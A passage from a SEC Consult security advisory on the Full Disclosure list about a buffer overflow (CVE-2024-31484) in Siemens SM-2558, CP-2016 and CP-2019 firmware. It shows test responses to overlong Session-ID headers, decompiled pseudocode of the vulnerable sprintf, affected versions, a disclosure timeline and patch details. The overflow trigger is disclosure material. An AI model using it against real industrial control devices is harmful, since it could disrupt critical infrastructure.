Session-ID: 3814280BA992fd00000000000000
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 0

c) Session ID value 3814280BA992fd00000000000000... (in total 618 characters) results in three HTTP responses
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

d) Session ID value 3814280BA992fd00000000000000... (in total 1260 characters) results in a HTTP 500 - internal server
error
HTTP/1.1 500 Internal Server Error
Content-Type: text/html
Content-Length: 198

<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>Sorry, an unexpected internal server
error occurred while processing your request.</p></body></html>

Pseudocode of vulnerable function:
[...]
    sessiond_id = (char *)get_http_header(a1, (int)"Session-ID"); <<<<<<<<<<<<<<<< session_id is extracted from HTTP
request
    if ( !sessiond_id )
      goto LABEL_194;
    if ( unk_51CD1C )
    {
      v11 = 0;
    }
    else
    {
      sub_3DB0E4((unsigned int)byte_51CD08, (unsigned int)sessiond_id, 0x14u);
      v11 = 1;
    }
    if ( sub_15332C() == 1 )
    {
      v134 = 0;
      if ( sub_155BC4(a1, (int)v133) || !v134 )
      {
LABEL_49:
        sequence_id = get_http_header_int(a1, "Sequence-ID");
        sprintf(                      <<<<<<<<<<<<<<<< response_buffer overflows here
          response_buffer,
          "HTTP/1.1 200 OK\r\n"
          "Server: %s\r\n"
          "Version: %u\r\n"
          "Session-ID: %s\r\n"
          "Sequence-ID: %lu\r\n"
          "Content-Type: text/plain\r\n"
          "Content-Length: 0\r\n"
          "\r\n",
          "SICAM 1703",
          1,
          sessiond_id,
          sequence_id);
[...]

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
- Webserver that runs on Firmware Version 10A45 of the Zynq FPGA.
- The Hardware revision of the device was unknown.

According to the vendor, the following firmware versions for the SM-2558
are affected by CVE-2024-31484:
* ETA4 Ethernet Interface IEC60870-5-104: All versions < V10.46
* ETA5 Ethernet Int. 1x100TX IEC61850 Ed.2: All versions < V03.27

Note that the same vulnerability exists as well in other products'
firmware versions, namely:
* CPCX26 Central Processing/Communication for CP-2016: All versions < V06.02
* PCCX26 Ax 1703 PE, Contr, Communication Element for CP-2019: All versions < V06.05

Vendor contact timeline:
------------------------
2024-03-05: Contacting vendor through productcert () siemens com
2024-03-06: Siemens tracks this as #22436
2024-04-03: Requested status update.
2024-04-03: Siemens can reproduce vulnerabilities and will evaluate buffer overflow.
            Hardware is EOL, no fix for the JTAG issue.
2024-06-11: Siemens publishes SSA-620338 and confirms the buffer overflow.
2024-07 - 2024-09: Various vacation / absences, delaying advisory coordination.
2024-10-22: Meeting with ProductCERT, discussing release of SM-2558 advisory.
2024-10-31: Sending advisory draft to ProductCERT.
2024-11-14: Receiving feedback on advisory draft.
2024-11-19: Sending updated advisory to ProductCERT.
2024-11-25: Coordinated release of advisory.

Solution:
---------
The vendor provides patches for the affected devices / components
to fix CVE-2024-31484:
* ETA4 for SM-2558: Upgrade to V10.46
* ETA5 for SM-2558: Upgrade to V03.27
* CPCX26 for CP-2016: Upgrade to V06.02
* PCCX26 for CP-2019: Upgrade to V06.05

More detailed information can be found in the Siemens Security Advisory SSA-620338:
<https://cert-portal.siemens.com/productcert/html/ssa-620338.html>

The hardware (SM-2558) is considered end of life (EOL), thus no new version
with a fixed JTAG will be released. Restrict physical access to the device.

Workaround:
-----------
Make sure to strictly limit physical access to the PLCs containing the protocol
element during and also after its life cycle.

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <https://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Constantin Schieber-Knöbl, Stefan Viehböck / @2024

```

[![](att-18/figure_1.png)](att-18/figure_1.png)

[![](att-18/figure_2.png)](att-18/figure_2.png)

[![](att-18/figure_3.png)](att-18/figure_3.png)

[![](att-18/figure_4.png)](att-18/figure_4.png)

[![](att-18/figure_5.png)](att-18/figure_5.png)

**Attachment:
[smime.p7s](att-18/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

### Current thread:

* **SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 & CP-2019** *SEC Consult Vulnerability Lab via Fulldisclosure (Nov 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


